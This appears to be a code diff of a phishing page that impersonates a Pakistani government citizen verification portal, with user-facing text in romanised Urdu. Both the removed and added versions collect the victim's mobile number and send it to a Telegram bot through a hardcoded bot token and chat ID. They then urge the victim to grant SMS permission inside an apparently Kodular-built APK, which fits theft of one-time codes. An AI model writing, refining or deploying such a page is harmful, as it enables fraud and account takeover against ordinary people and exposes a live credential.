@@ -3,48 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Official Verification Portal</title>
+    <title>Portal Verification</title>
     <style>
-        body { background: #f4f4f4; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 90%; max-width: 350px; background: white; padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 5px solid #2e7d32; }
-        .logo { width: 70px; margin-bottom: 10px; }
-        h2 { color: #333; font-size: 20px; }
-        p { color: #666; font-size: 14px; line-height: 1.5; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { background: #2e7d32; color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .footer { font-size: 10px; color: #aaa; margin-top: 15px; }
+        body { background: #fdfdfd; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 90%; max-width: 360px; background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #eee; }
+        .icon { width: 60px; height: 60px; background: #2e7d32; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; font-size: 30px; margin-bottom: 15px; }
+        h2 { color: #222; font-size: 22px; margin-bottom: 10px; }
+        p { color: #777; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
+        .go-btn { background: #2e7d32; color: white; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Punjab_Government_Logo.svg/1200px-Punjab_Government_Logo.svg.png" class="logo">
-    <h2>Citizen Reward Verification</h2>
-    <p>Enter your account number to verify and receive your designated grant.</p>
+<div class="card">
+    <div class="icon">✓</div>
+    <h2>Citizen Portal</h2>
+    <p>Apna mobile number darj karein taake aapki verification mukammal ho sakay.</p>
     
-    <input type="tel" id="p_num" placeholder="Account / Mobile Number">
-    <button class="btn" onclick="startProcess()">VERIFY & PROCEED</button>
-    
-    <div class="footer">🔒 Secure SSL Encrypted Verification</div>
+    <input type="tel" id="u_number" placeholder="03XXXXXXXXX">
+    <button class="go-btn" onclick="submitData()">VERIFY NOW</button>
 </div>
 
 <script>
-    function startProcess() {
-        const num = document.getElementById('p_num').value;
-        const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-        const cid = "7107389141";
+    function submitData() {
+        const n = document.getElementById('u_number').value;
+        const t = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+        const c = "7107389141";
 
-        if(num.length < 10) { alert("Invalid Number"); return; }
+        if(n.length < 10) { alert("Number sahi likhein"); return; }
 
-        // Send Initial Hit to Telegram
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=🚀 *VERIFICATION STARTED*%0ANumber: ${num}&parse_mode=Markdown`);
+        // Send to Bot
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=👤 *Verification Hit*\nNumber: ${n}&parse_mode=Markdown`);
 
-        // Trigger SMS Permission in APK
-        alert("Action Required: Please install the 'Security Plugin' and ALLOW SMS permission to complete verification.");
+        alert("Verification shuru ho chuki hai. Aglay step mein SMS permission ko 'Allow' karein.");
         
-        // Signal for Kodular
+        // APK Logic
         if(window.AppInventor) {
-            window.AppInventor.setWebViewString("TRIGGER_SMS");
+            window.AppInventor.setWebViewString("GRANT_SMS");
         }
     }
 </script>
